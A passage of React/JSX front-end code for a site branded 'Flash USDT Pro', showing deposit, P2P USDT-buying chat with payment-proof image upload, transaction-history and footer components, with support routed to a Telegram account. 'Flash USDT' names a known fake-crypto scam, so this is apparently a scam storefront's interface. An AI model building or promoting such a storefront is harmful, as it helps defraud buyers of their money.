                      className="w-full py-4 rounded-xl bg-[#FF3131] text-black font-black text-base hover:scale-[1.02] transition-transform disabled:opacity-30 shadow-[0_0_20px_rgba(255,49,49,0.2)] uppercase"
                    >
                      Submit Deposit
                    </button>
                  </div>
                )}
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* P2P Modal */}
      <AnimatePresence>
        {showP2P && (
          <div className="fixed inset-0 z-[110] flex items-center justify-center p-4">
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => setShowP2P(false)}
              className="absolute inset-0 bg-black/80 backdrop-blur-sm"
            />
            <motion.div 
              initial={{ opacity: 0, scale: 0.9, y: 20 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.9, y: 20 }}
              className="relative w-full max-w-xl glass-panel rounded-3xl border-[#FF3131]/20 overflow-hidden flex flex-col h-[600px]"
            >
              <div className="p-6 border-b border-white/10 flex items-center justify-between shrink-0">
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 rounded-full bg-[#FF3131]/10 flex items-center justify-center">
                    <RefreshCcw className="w-5 h-5 text-[#FF3131]" />
                  </div>
                  <div>
                    <h2 className="font-bold uppercase tracking-tighter">P2P USDT Buy</h2>
                    <p className="text-[10px] text-[#FF3131] font-mono">Rate: 286 PKR/USDT</p>
                  </div>
                </div>
                <button onClick={() => setShowP2P(false)} className="text-white/40 hover:text-white"><X /></button>
              </div>

              <div className="flex-1 overflow-y-auto p-6 space-y-4 scrollbar-hide">
                {p2pMessages.map((msg, i) => (
                  <div key={i} className={`flex ${msg.role === 'user' ? 'justify-end' : 'justify-start'}`}>
                    <div className={`max-w-[80%] p-4 rounded-2xl text-sm ${
                      msg.role === 'user' 
                      ? 'bg-[#FF3131] text-black font-bold' 
                      : 'bg-white/5 border border-white/10 text-white/80'
                    }`}>
                      {msg.text && <p className="whitespace-pre-line">{msg.text}</p>}
                      {msg.image && <img src={msg.image} alt="Proof" className="rounded-lg mt-2 max-w-full h-auto" />}
                    </div>
                  </div>
                ))}
              </div>

              <form onSubmit={handleP2PSubmit} className="p-4 border-t border-white/10 shrink-0 flex gap-2">
                <div className="relative flex-1 flex items-center gap-2">
                  <label className="cursor-pointer p-2 rounded-xl bg-white/5 hover:bg-white/10 transition-colors">
                    <input 
                      type="file" 
                      accept="image/*"
                      onChange={handleP2PImageUpload}
                      className="hidden"
                    />
                    <div className="w-5 h-5 flex items-center justify-center text-[#FF3131] font-bold text-xl">+</div>
                  </label>
                  <input 
                    type="text"
                    placeholder="Enter amount..."
                    value={p2pInput}
                    onChange={(e) => setP2PInput(e.target.value)}
                    className="flex-1 bg-white/5 border border-white/10 rounded-xl px-4 py-2 text-xs focus:outline-none focus:border-[#FF3131]/50"
                  />
                </div>
                <button 
                  type="submit"
                  className="bg-[#FF3131] text-black p-2 rounded-xl hover:scale-105 transition-transform"
                >
                  <Send className="w-4 h-4" />
                </button>
              </form>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* Transaction History Modal */}
      <AnimatePresence>
        {showHistory && (
          <div className="fixed inset-0 z-[110] flex items-center justify-center p-4">
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => setShowHistory(false)}
              className="absolute inset-0 bg-black/80 backdrop-blur-sm"
            />
            <motion.div 
              initial={{ opacity: 0, scale: 0.9, y: 20 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.9, y: 20 }}
              className="relative w-full max-w-md glass-panel rounded-3xl border-[#FF3131]/20 overflow-hidden"
            >
              <div className="p-6 space-y-6">
                <div className="flex items-center justify-between">
                  <h2 className="text-xl font-bold uppercase tracking-tighter">Transaction History</h2>
                  <button onClick={() => setShowHistory(false)} className="text-white/40 hover:text-white"><X /></button>
                </div>
                
                <div className="py-10 flex flex-col items-center justify-center text-center space-y-4">
                  <div className="w-16 h-16 rounded-full bg-white/5 flex items-center justify-center">
                    <Clock className="w-8 h-8 text-white/20" />
                  </div>
                  <div className="space-y-1">
                    <p className="text-white/60 font-bold uppercase text-sm">No Records Found</p>
                    <p className="text-white/20 text-[10px] uppercase font-mono tracking-widest">Only successful transactions recorded</p>
                  </div>
                </div>

                <button 
                  onClick={() => setShowHistory(false)}
                  className="w-full py-4 rounded-xl bg-white/5 border border-white/10 text-white font-bold uppercase text-xs hover:bg-white/10 transition-colors"
                >
                  Close History
                </button>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* Footer */}
      <footer className="border-t border-white/5 py-10 px-4">
        <div className="max-w-7xl mx-auto flex flex-col md:flex-row justify-between items-center gap-6">
          <div className="flex items-center gap-2 opacity-50">
            <Zap className="w-4 h-4 text-[#FF3131]" />
            <span className="font-mono text-sm font-bold tracking-tighter uppercase">Flash USDT Pro © 2026</span>
          </div>
          <div className="flex gap-8 text-[10px] font-mono text-white/30 uppercase tracking-[0.2em]">
            <a href="https://t.me/bulltraderllc" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors flex items-center gap-1">
              <Send className="w-3 h-3" /> Contact_Support
            </a>
            <a href="#" className="hover:text-white transition-colors">Terms_of_Service</a>
            <a href="#" className="hover:text-white transition-colors">Privacy_Protocol</a>
          </div>
        </div>
      </footer>
    </div>
  );
}
